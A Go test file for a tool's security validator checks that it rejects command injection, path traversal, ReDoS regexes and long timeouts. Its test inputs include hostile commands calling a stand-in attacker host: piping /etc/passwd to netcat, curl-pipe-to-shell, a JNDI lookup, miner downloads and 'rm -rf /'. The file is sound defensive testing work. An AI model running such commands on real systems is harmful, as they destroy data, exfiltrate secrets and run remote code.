package security

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/bebsworthy/qualhook/pkg/config"
)

// TestSecurityIntegration_CommandExecution tests end-to-end security for command execution
func TestSecurityIntegration_CommandExecution(t *testing.T) {
	validator := NewSecurityValidator()

	// Create a temporary directory for safe operations
	tmpDir, err := os.MkdirTemp("", "qualhook-security-integration-*")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tmpDir)

	scenarios := []struct {
		name        string
		command     string
		args        []string
		workingDir  string
		env         []string
		shouldFail  bool
		failureType string
	}{
		{
			name:       "safe command execution",
			command:    "echo",
			args:       []string{"hello", "world"},
			workingDir: tmpDir,
			env:        []string{"SAFE_VAR=value"},
			shouldFail: false,
		},
		{
			name:        "command injection attempt",
			command:     "echo",
			args:        []string{"test; rm -rf /"},
			shouldFail:  true,
			failureType: "injection",
		},
		{
			name:        "path traversal in working directory",
			command:     "echo",
			args:        []string{"test"},
			workingDir:  "../../../etc",
			shouldFail:  true,
			failureType: "traversal",
		},
		{
			name:       "environment variable injection",
			command:    "echo",
			args:       []string{"test"},
			env:        []string{"MALICIOUS=$(rm -rf /)"},
			shouldFail: false, // Environment should be sanitized, not fail
		},
		{
			name:        "dangerous command with force flags",
			command:     "rm",
			args:        []string{"-rf", "/tmp/important"},
			shouldFail:  true,
			failureType: "dangerous",
		},
		{
			name:        "null byte in arguments",
			command:     "echo",
			args:        []string{"test\x00malicious"},
			shouldFail:  true,
			failureType: "null",
		},
	}

	for _, scenario := range scenarios {
		t.Run(scenario.name, func(t *testing.T) {
			// Validate command
			cmdErr := validator.ValidateCommand(scenario.command, scenario.args)

			// Validate working directory if provided
			var dirErr error
			if scenario.workingDir != "" {
				dirErr = validator.ValidatePath(scenario.workingDir)
			}

			// Check environment variables
			var envIssues []string
			for _, env := range scenario.env {
				parts := strings.SplitN(env, "=", 2)
				if len(parts) == 2 {
					if err := validateEnvValue(parts[0], parts[1]); err != nil {
						envIssues = append(envIssues, err.Error())
					}
				}
			}

			// Determine if we got expected result
			failed := cmdErr != nil || dirErr != nil
			if failed != scenario.shouldFail {
				t.Errorf("Expected failure=%v, got cmdErr=%v, dirErr=%v",
					scenario.shouldFail, cmdErr, dirErr)
			}

			// Check failure type if applicable
			if scenario.shouldFail && scenario.failureType != "" {
				errorMsg := ""
				if cmdErr != nil {
					errorMsg = cmdErr.Error()
				} else if dirErr != nil {
					errorMsg = dirErr.Error()
				}

				switch scenario.failureType {
				case "injection":
					if !strings.Contains(errorMsg, "injection") && !strings.Contains(errorMsg, "dangerous pattern") {
						t.Errorf("Expected injection error, got: %s", errorMsg)
					}
				case "traversal":
					if !strings.Contains(errorMsg, "traversal") && !strings.Contains(errorMsg, "forbidden") {
						t.Errorf("Expected traversal error, got: %s", errorMsg)
					}
				case "dangerous":
					if !strings.Contains(errorMsg, "dangerous") {
						t.Errorf("Expected dangerous command error, got: %s", errorMsg)
					}
				case "null":
					if !strings.Contains(errorMsg, "null") {
						t.Errorf("Expected null byte error, got: %s", errorMsg)
					}
				}
			}

			// Log environment issues (these are sanitized, not failures)
			if len(envIssues) > 0 {
				t.Logf("Environment issues (sanitized): %v", envIssues)
			}
		})
	}
}

// TestSecurityIntegration_ConfigurationValidation tests comprehensive config validation
func TestSecurityIntegration_ConfigurationValidation(t *testing.T) {
	validator := NewSecurityValidator()

	// Test various configuration scenarios
	configs := []struct {
		name       string
		cfg        *config.Config
		shouldFail bool
		issues     []string
	}{
		{
			name: "safe configuration",
			cfg: &config.Config{
				Version: "1.0",
				Commands: map[string]*config.CommandConfig{
					"format": {
						Command: "prettier",
						Args:    []string{"--write", "**/*.js"},
						Timeout: 30000,
						ErrorPatterns: []*config.RegexPattern{
							{Pattern: "error:\\s+(.+)"},
						},
					},
				},
			},
			shouldFail: false,
		},
		{
			name: "configuration with shell injection",
			cfg: &config.Config{
				Version: "1.0",
				Commands: map[string]*config.CommandConfig{
					"malicious": {
						Command: "sh",
						Args:    []string{"-c", "cat /etc/passwd | nc evil.com 1337"},
					},
				},
			},
			shouldFail: true,
			issues:     []string{"injection", "dangerous"},
		},
		{
			name: "configuration with ReDoS pattern",
			cfg: &config.Config{
				Version: "1.0",
				Commands: map[string]*config.CommandConfig{
					"test": {
						Command: "echo",
						ErrorPatterns: []*config.RegexPattern{
							{Pattern: "(a+)+b"},
						},
					},
				},
			},
			shouldFail: true,
			issues:     []string{"catastrophic", "backtracking"},
		},
		{
			name: "configuration with path traversal",
			cfg: &config.Config{
				Version: "1.0",
				Paths: []*config.PathConfig{
					{
						Path: "../../../etc",
						Commands: map[string]*config.CommandConfig{
							"read": {
								Command: "cat",
								Args:    []string{"passwd"},
							},
						},
					},
				},
			},
			shouldFail: true,
			issues:     []string{"traversal"},
		},
		{
			name: "configuration with excessive timeout",
			cfg: &config.Config{
				Version: "1.0",
				Commands: map[string]*config.CommandConfig{
					"slow": {
						Command: "sleep",
						Args:    []string{"3600"},
						Timeout: 7200000, // 2 hours
					},
				},
			},
			shouldFail: true,
			issues:     []string{"timeout", "exceeds"},
		},
	}

	for _, tc := range configs {
		t.Run(tc.name, func(t *testing.T) {
			var allErrors []string

			// Validate commands
			for name, cmd := range tc.cfg.Commands {
				// Validate command and args
				if err := validator.ValidateCommand(cmd.Command, cmd.Args); err != nil {
					allErrors = append(allErrors, err.Error())
				}

				// Validate timeout
				if cmd.Timeout > 0 {
					timeout := time.Duration(cmd.Timeout) * time.Millisecond
					if err := validator.ValidateTimeout(timeout); err != nil {
						allErrors = append(allErrors, err.Error())
					}
				}

				// Validate patterns
				if cmd.ErrorPatterns != nil {
					for _, pattern := range cmd.ErrorPatterns {
						if err := validator.ValidateRegexPattern(pattern.Pattern); err != nil {
							allErrors = append(allErrors, err.Error())
						}
					}
				}

				t.Logf("Validated command %s", name)
			}

			// Validate paths
			for _, pathCfg := range tc.cfg.Paths {
				// For path patterns, we check for dangerous patterns
				if strings.Contains(pathCfg.Path, "..") {
					allErrors = append(allErrors, "path contains directory traversal")
				}
				if filepath.IsAbs(pathCfg.Path) {
					allErrors = append(allErrors, "absolute paths not allowed")
				}
			}

			// Check results
			failed := len(allErrors) > 0
			if failed != tc.shouldFail {
				t.Errorf("Expected failure=%v, got %d errors: %v",
					tc.shouldFail, len(allErrors), allErrors)
			}

			// Verify expected issues were found
			if tc.shouldFail && len(tc.issues) > 0 {
				errorStr := strings.Join(allErrors, " ")
				for _, issue := range tc.issues {
					if !strings.Contains(strings.ToLower(errorStr), strings.ToLower(issue)) {
						t.Errorf("Expected issue containing %q not found in errors: %v",
							issue, allErrors)
					}
				}
			}
		})
	}
}

// TestSecurityIntegration_DefenseInDepth tests multiple layers of security
func TestSecurityIntegration_DefenseInDepth(t *testing.T) {
	validator := NewSecurityValidator()

	// Test that multiple security layers catch different attack vectors
	attacks := []struct {
		name         string
		description  string
		command      string
		args         []string
		env          []string
		workingDir   string
		regexPattern string
		timeout      time.Duration
		blockedAt    []string // Which layers should block this
	}{
		{
			name:        "multi-vector attack 1",
			description: "Command injection + environment manipulation",
			command:     "echo",
			args:        []string{"$EVIL_CMD; rm -rf /"},
			env:         []string{"EVIL_CMD=rm -rf /"},
			blockedAt:   []string{"command validation"},
		},
		{
			name:        "multi-vector attack 2",
			description: "Path traversal + dangerous command",
			command:     "cat",
			args:        []string{"../../../etc/shadow"},
			workingDir:  "/etc", // Use /etc which is definitely outside project
			blockedAt:   []string{"path validation"},
		},
		{
			name:         "multi-vector attack 3",
			description:  "ReDoS + resource exhaustion",
			command:      "grep",
			args:         []string{"-E", "(a*)*b"},
			regexPattern: "(x+)+y",
			timeout:      2 * time.Hour,
			blockedAt:    []string{"regex validation", "timeout validation"},
		},
		{
			name:        "multi-vector attack 4",
			description: "Encoded injection + null bytes",
			command:     "echo",
			args:        []string{"test%3Brm%20-rf%20/", "more\x00data"},
			blockedAt:   []string{"command validation"},
		},
	}

	for _, attack := range attacks {
		t.Run(attack.name, func(t *testing.T) {
			t.Logf("Testing: %s", attack.description)

			blocked := []string{}

			// Layer 1: Command validation
			if err := validator.ValidateCommand(attack.command, attack.args); err != nil {
				blocked = append(blocked, "command validation")
				t.Logf("Blocked at command validation: %v", err)
			}

			// Layer 2: Path validation
			if attack.workingDir != "" {
				if err := validator.ValidatePath(attack.workingDir); err != nil {
					blocked = append(blocked, "path validation")
					t.Logf("Blocked at path validation: %v", err)
				}
			}

			// Layer 3: Environment sanitization
			if len(attack.env) > 0 {
				sanitized := SanitizeEnvironment(attack.env, false)
				if len(sanitized) < len(attack.env) {
					blocked = append(blocked, "environment sanitization")
					t.Logf("Environment sanitized: %d vars removed", len(attack.env)-len(sanitized))
				}
			}

			// Layer 4: Regex validation
			if attack.regexPattern != "" {
				if err := validator.ValidateRegexPattern(attack.regexPattern); err != nil {
					blocked = append(blocked, "regex validation")
					t.Logf("Blocked at regex validation: %v", err)
				}
			}

			// Layer 5: Timeout validation
			if attack.timeout > 0 {
				if err := validator.ValidateTimeout(attack.timeout); err != nil {
					blocked = append(blocked, "timeout validation")
					t.Logf("Blocked at timeout validation: %v", err)
				}
			}

			// Verify attack was blocked
			if len(blocked) == 0 {
				t.Error("Attack was not blocked by any security layer!")
			}

			// Verify expected blocking points
			for _, expectedBlock := range attack.blockedAt {
				found := false
				for _, actualBlock := range blocked {
					if strings.Contains(actualBlock, expectedBlock) {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("Expected attack to be blocked at %q, but it wasn't", expectedBlock)
				}
			}

			t.Logf("Attack blocked at %d layers: %v", len(blocked), blocked)
		})
	}
}

// TestSecurityIntegration_RealWorldScenarios tests against real-world attack patterns
func TestSecurityIntegration_RealWorldScenarios(t *testing.T) {
	validator := NewSecurityValidator()

	// Real-world attack scenarios based on common vulnerabilities
	scenarios := []struct {
		name        string
		description string
		test        func(t *testing.T, v *SecurityValidator)
	}{
		{
			name:        "Log4Shell-style attack",
			description: "JNDI injection attempt through command arguments",
			test: func(t *testing.T, v *SecurityValidator) {
				maliciousArgs := []string{
					"${jndi:ldap://evil.com/a}",
					"${env:AWS_SECRET_ACCESS_KEY}",
					"${sys:user.home}",
				}
				for _, arg := range maliciousArgs {
					err := v.ValidateCommand("java", []string{"-jar", "app.jar", arg})
					if err == nil || !strings.Contains(err.Error(), "dangerous pattern") {
						t.Errorf("Log4Shell-style injection not blocked: %s", arg)
					}
				}
			},
		},
		{
			name:        "Container escape attempt",
			description: "Trying to escape container through volume mounts",
			test: func(t *testing.T, v *SecurityValidator) {
				escapePaths := []string{
					"/proc/self/root",
					"/host/etc/passwd",
					"/../../../proc/1/root",
				}
				for _, path := range escapePaths {
					err := v.ValidatePath(path)
					if err == nil {
						t.Errorf("Container escape path not blocked: %s", path)
					}
				}
			},
		},
		{
			name:        "Supply chain attack",
			description: "Malicious npm script execution",
			test: func(t *testing.T, v *SecurityValidator) {
				maliciousScripts := []struct {
					cmd  string
					args []string
				}{
					{"npm", []string{"run", "postinstall", "&&", "curl", "evil.com/steal.sh", "|", "sh"}},
					{"npm", []string{"install", "malicious-package@latest", ";", "node", "-e", "require('child_process').exec('whoami')"}},
				}
				for _, script := range maliciousScripts {
					err := v.ValidateCommand(script.cmd, script.args)
					if err == nil {
						t.Errorf("Supply chain attack not blocked: %s %v", script.cmd, script.args)
					}
				}
			},
		},
		{
			name:        "Cryptomining attempt",
			description: "Hidden cryptocurrency mining through build scripts",
			test: func(t *testing.T, v *SecurityValidator) {
				miningCommands := []struct {
					cmd  string
					args []string
				}{
					{"curl", []string{"-o", "/etc/xmrig", "http://evil.com/xmrig"}},
					{"wget", []string{"--output", "/usr/bin/miner", "http://pool.minexmr.com/miner"}},
				}
				for _, mining := range miningCommands {
					err := v.ValidateCommand(mining.cmd, mining.args)
					if err == nil || !strings.Contains(err.Error(), "dangerous") {
						t.Errorf("Cryptomining attempt not blocked: %s %v", mining.cmd, mining.args)
					}
				}
			},
		},
		{
			name:        "CI/CD pipeline poisoning",
			description: "Attempting to modify CI configuration",
			test: func(t *testing.T, v *SecurityValidator) {
				poisonPaths := []string{
					".github/workflows/main.yml",
					"../../.github/workflows/deploy.yml",
					"../.circleci/config.yml",
				}
				for _, path := range poisonPaths {
					if strings.Contains(path, "..") {
						err := v.ValidatePath(path)
						if err == nil || !strings.Contains(err.Error(), "traversal") {
							t.Errorf("CI poisoning path not blocked: %s", path)
						}
					}
				}
			},
		},
	}

	for _, scenario := range scenarios {
		t.Run(scenario.name, func(t *testing.T) {
			t.Logf("Testing scenario: %s", scenario.description)
			scenario.test(t, validator)
		})
	}
}
